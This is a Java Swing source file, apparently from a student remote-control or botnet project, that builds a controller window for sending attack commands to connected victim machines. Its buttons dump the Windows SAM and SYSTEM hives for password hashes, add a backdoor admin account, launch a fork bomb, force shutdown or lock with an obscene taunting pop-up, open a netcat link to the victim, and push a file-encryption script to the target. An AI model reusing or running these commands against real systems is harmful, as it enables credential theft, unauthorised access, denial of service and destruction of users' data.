package gui;

import java.awt.Color;
import java.awt.Font;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.Random;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import master.Connexion;
import constante.Constante;

/**
 * Classe Heritant de MJinternalFrame qui ouvre une fenetre donnant a
 * l'utilisateur maitre une interface graphique qui lui permet de lancer
 * directement certaines vilaines commandes déja implémentées
 * 
 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
 *
 */
public class MotherJInternalFrame extends MJInternalFrame
{

	// Parametres :
	// =====================================================================

	private boolean	m_OSVersion;
	private Connexion connexion;

	// Constructeur :
	// =====================================================================

	public MotherJInternalFrame(String title, final Connexion connexion,
			int nframe)
	{
		super(title, connexion, nframe);
		setFrameIcon(new ImageIcon(Paths.get("").toAbsolutePath().toString()
				+ File.separator + "ressources" + File.separator + "mask1.png"));
		getContentPane().setBackground(new Color(0, 102, 153));
		getContentPane().setForeground(new Color(102, 153, 51));
		this.connexion = connexion;
		if (connexion.get_os_name().contains("win")
				|| connexion.get_os_name().contains("Win"))
		{
			m_OSVersion = true;
		}
		else
			m_OSVersion = false;

		UIManager UI = new UIManager();
		UI.put("OptionPane.background", new Color(0, 153, 255));
		UI.put("Panel.background", new Color(0, 153, 255));

		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		GridBagLayout gridBagLayout = new GridBagLayout();
		gridBagLayout.columnWidths = new int[]
		{ 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		gridBagLayout.rowHeights = new int[]
		{ 0, 0, 0, 0, 0, 0, 0, 0, 0 };
		gridBagLayout.columnWeights = new double[]
		{ 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };
		gridBagLayout.rowWeights = new double[]
		{ 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };
		getContentPane().setLayout(gridBagLayout);

		JButton btnNewButton = new JButton("Shutdown Computer");
		btnNewButton.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton
				.setIcon(new ImageIcon(Paths.get("").toAbsolutePath().toString()
						+ File.separator + "ressources" + File.separator
						+ "criminal23.png"));
		btnNewButton.setBackground(new Color(0, 204, 102));
		btnNewButton.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton = new GridBagConstraints();
		gbc_btnNewButton.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton.gridx = 2;
		gbc_btnNewButton.gridy = 1;
		getContentPane().add(btnNewButton, gbc_btnNewButton);
		btnNewButton.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				shutdownComputer();
			}

			private void shutdownComputer()
			{
				if (!m_OSVersion)
				{
					connexion.sendCmdCommand("shutdown +1");
					connexion
							.sendNotification(
									"Votre ordinateur va s'eteindre dans 1 minutes",
									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
				}
				else
				{
					connexion
							.sendNotification(
									"Votre ordinateur va s'eteindre dans 1 minutes",
									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
					connexion
							.sendCmdCommand("rundll32.exe user32.dll, LockWorkStation"); // shutdown
					// -c
					// “Stupide
					// ahah!”
					// -s
					// -t
					// 10
					// version
					// moins
					// cool

				}
			}

		});

		JButton btnNewButton_4 = new JButton("Dump Sam");
		btnNewButton_4.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_4.setBackground(new Color(0, 204, 102));
		btnNewButton_4.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_4 = new GridBagConstraints();
		gbc_btnNewButton_4.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton_4.gridx = 5;
		gbc_btnNewButton_4.gridy = 1;
		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);
		btnNewButton_4.addMouseListener(new MouseAdapter()
		{
			private void dumptheHash()
			{
				// TODO Auto-generated method stub
				if (m_OSVersion)
				{
					connexion.sendCmdCommand("reg save HKLM\\SAM %"
							+ connexion.get_user_name() + "%.sam");
					connexion.sendCmdCommand("save %" + connexion.get_user_name()
							+ "%.sam");
					connexion.sendCmdCommand("reg save HKLM\\SYSTEM %"
							+ connexion.get_user_name() + "%.system");
					connexion.sendCmdCommand("save " + connexion.get_user_name()
							+ "%.system");
				}
			}

			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				dumptheHash();
			}
		});

		JButton btnNewButton_1 = new JButton("Netcat\r\n");
		btnNewButton_1.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_1.setBackground(new Color(0, 204, 102));
		btnNewButton_1.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_1 = new GridBagConstraints();
		gbc_btnNewButton_1.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton_1.gridx = 2;
		gbc_btnNewButton_1.gridy = 3;
		getContentPane().add(btnNewButton_1, gbc_btnNewButton_1);
		btnNewButton_1.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				try
				{
					netcat();
				}
				catch (IOException e)
				{
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}

			private void netcat() throws IOException
			{
				if (!m_OSVersion)
				{
					connexion.sendCmdCommand("$ nc -l 33333");
					Runtime.getRuntime().exec(
							"cmd.exe /c start nc " + connexion.get_ip() + " 33333");
				}
				else
				{
					// _connexion.sendCmdCommand("netcat -l -p 11111");
					// Runtime.getRuntime().exec(
					// "cmd.exe /c start nc" + _connexion.get_ip() + " 33333");
					Runtime rt = Runtime.getRuntime();
					rt.exec("cmd.exe /c start color 02 & :debut echo %random% %random% %random% %random% HACKING begins & goto debut");

				}
			}
		});
		JButton btnNewButton_5 = new JButton("Ajouter utilisateur");
		btnNewButton_5.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_5.setBackground(new Color(0, 204, 102));
		btnNewButton_5.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_5 = new GridBagConstraints();
		gbc_btnNewButton_5.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton_5.gridx = 5;
		gbc_btnNewButton_5.gridy = 3;
		getContentPane().add(btnNewButton_5, gbc_btnNewButton_5);
		btnNewButton_5.addMouseListener(new MouseAdapter()
		{
			private void ajouterUtilisateur()
			{
				if (!m_OSVersion)
				{

				}
				else
				{
					connexion
							.sendCmdCommand("net user admin11  /add /passwordchg:no");
				}
			}

			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				ajouterUtilisateur();
			}
		});

		JButton btnNewButton_2 = new JButton("Fork Bomb");
		btnNewButton_2.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_2.setBackground(new Color(0, 204, 102));
		btnNewButton_2.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_2 = new GridBagConstraints();
		gbc_btnNewButton_2.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton_2.gridx = 2;
		gbc_btnNewButton_2.gridy = 5;
		getContentPane().add(btnNewButton_2, gbc_btnNewButton_2);
		btnNewButton_2.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				forkbomb();
			}
		});
		JButton btnNewButton_6 = new JButton("Encrypt all files");
		btnNewButton_6.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_6.setBackground(new Color(0, 204, 102));
		btnNewButton_6.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_6 = new GridBagConstraints();
		gbc_btnNewButton_6.insets = new Insets(0, 0, 5, 5);
		gbc_btnNewButton_6.gridx = 5;
		gbc_btnNewButton_6.gridy = 5;
		getContentPane().add(btnNewButton_6, gbc_btnNewButton_6);
		btnNewButton_2.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				File file = new File(Paths.get("").toAbsolutePath().toString()
						+ File.separator + "script" + File.separator
						+ "encrypt.19719");

				if (file.exists() && !m_OSVersion)
					connexion.sendfile(file);
			}
		});
		JButton btnNewButton_3 = new JButton("New button");
		btnNewButton_3.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_3.setBackground(new Color(0, 204, 102));
		btnNewButton_3.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_3 = new GridBagConstraints();
		gbc_btnNewButton_3.insets = new Insets(0, 0, 0, 5);
		gbc_btnNewButton_3.gridx = 2;
		gbc_btnNewButton_3.gridy = 7;
		getContentPane().add(btnNewButton_3, gbc_btnNewButton_3);

		JButton btnNewButton_7 = new JButton("Lack of Inspiration");
		btnNewButton_7.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
		btnNewButton_7.setBackground(new Color(0, 204, 102));
		btnNewButton_7.setForeground(new Color(0, 0, 153));
		GridBagConstraints gbc_btnNewButton_7 = new GridBagConstraints();
		gbc_btnNewButton_7.insets = new Insets(0, 0, 0, 5);
		gbc_btnNewButton_7.gridx = 5;
		gbc_btnNewButton_7.gridy = 7;
		getContentPane().add(btnNewButton_7, gbc_btnNewButton_7);
		btnNewButton_7.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				random();
			}
		});
	}

	
	

	// Methodes :
	// =====================================================================

	private void forkbomb()
	{
		if (!m_OSVersion)
		{
			String s = (String) JOptionPane.showInputDialog(this,
					"89d4e9b083eda48662d7db6041d2305e0cd89b28", "Shhhhhhh",
					JOptionPane.PLAIN_MESSAGE, null, null, "???");

			// If a string was returned, say so.
			if ((s != null) && (s.length() > 0) && s.equals("ThinkItAgain"))
			{
				connexion.sendCmdCommand(":(){ :|: & };:");
				return;
			}
			else
			{
				JOptionPane.showMessageDialog(this, "Try it again");
			}

		}
		else
		{
			String s = (String) JOptionPane.showInputDialog(this,
					"89d4e9b083eda48662d7db6041d2305e0cd89b28", "Shhhhhhh",
					JOptionPane.PLAIN_MESSAGE, null, null, "???");

			// If a string was returned, say so.
			if ((s != null) && (s.length() > 0) && s.equals("	"))
			{
				connexion.sendCmdCommand("______");
				return;
			}
			else
			{
				JOptionPane.showMessageDialog(this, "Try it again");
			}

		}
	}

	private void random()
	{
		JOptionPane
				.showMessageDialog(
						this,
						(new Random().nextInt(10) < 8) ? Constante.listCommandeL[new Random()
								.nextInt(Constante.listCommandeL.length - 1)]
								: Constante.listeCommandeW[0], "Idees",
						JOptionPane.PLAIN_MESSAGE);
	}
}
